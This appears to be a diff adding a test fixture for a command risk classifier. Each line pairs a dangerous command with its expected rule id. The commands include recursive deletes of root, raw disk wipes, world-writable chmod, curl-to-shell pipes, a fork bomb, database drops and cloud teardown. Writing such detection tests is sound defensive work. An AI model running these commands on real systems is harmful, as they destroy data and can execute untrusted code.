@@ -1,0 +1,75 @@
+# T-SAFE-1 — one command per line, expected rule id after →
+# Every RiskClassifier rule id must appear at least once (meta-test).
+# Danger-level rules must classify as Danger (zero false negatives).
+
+# del
+rm -rf /                                      → del.recursive-force
+rm -rf ~                                      → del.recursive-force
+rm -rf $HOME                                  → del.recursive-force
+rm -rf .                                      → del.recursive-force
+rm -fr /                                      → del.recursive-force
+rm -r -f /                                    → del.recursive-force
+find . -name '*.log' -delete                  → del.find-delete
+find /var/log -type f -delete                 → del.find-delete
+find . -delete                                → del.find-delete
+
+# disk
+dd if=/dev/zero of=/dev/sda                   → disk.raw-write
+dd of=/dev/nvme0n1 if=/dev/zero               → disk.raw-write
+dd if=/dev/urandom of=/dev/sdb bs=1M          → disk.raw-write
+mkfs.ext4 /dev/sdb1                           → disk.mkfs
+mkfs.xfs /dev/sdc                             → disk.mkfs
+diskutil eraseDisk APFS Untitled /dev/disk2   → disk.mkfs
+wipefs -a /dev/sdb                            → disk.mkfs
+fdisk /dev/sda                                → disk.mkfs
+
+# perm
+chmod -R 777 /                                → perm.chmod-world
+chmod -R 777 ~                                → perm.chmod-world
+chown -R root /usr                            → perm.chown-system
+chown -R nobody /etc                          → perm.chown-system
+
+# net.pipe-to-shell
+curl -fsSL https://x | sh                     → net.pipe-to-shell
+curl -fsSL https://x | bash                   → net.pipe-to-shell
+wget -qO- https://x | zsh                     → net.pipe-to-shell
+eval "$(curl -fsSL https://x)"                → net.pipe-to-shell
+
+# fork.bomb
+:(){ :|:& };:                                 → fork.bomb
+
+# db
+DROP DATABASE prod;                           → db.drop
+DROP TABLE users;                             → db.drop
+TRUNCATE orders                               → db.drop
+DELETE FROM sessions                          → db.drop
+
+# cloud
+aws s3 rb s3://bucket --force                 → cloud.s3-rb-force
+aws s3 rb s3://my-bucket --force --region us-east-1 → cloud.s3-rb-force
+terraform destroy                             → cloud.terraform-destroy
+terraform destroy -auto-approve               → cloud.terraform-destroy
+gcloud compute instances delete box           → cloud.gcloud-delete
+
+# container (Review)
+docker system prune -a                        → container.prune-all
+docker volume rm data                         → container.volume-rm
+docker volume prune                           → container.volume-rm
+
+# vcs (Review)
+git push --force origin main                  → vcs.force-push
+git push -f                                   → vcs.force-push
+git reset --hard                              → vcs.reset-hard
+git reset --hard HEAD~3                       → vcs.reset-hard
+git clean -fdx                                → vcs.clean-fdx
+
+# proc (Review)
+kill -9 -1                                    → proc.kill-minus-one
+killall python                                → proc.killall
+pkill -f worker                               → proc.killall
+
+# secrets / sudo (Review)
+export KEY=sk-TESTFAKE0000000000000000        → secrets.inline
+AWS_KEY=AKIAIOSFODNN7EXAMPLE00                → secrets.inline
+sudo apt update                               → sudo.prefix
+sudo systemctl restart nginx                  → sudo.prefix
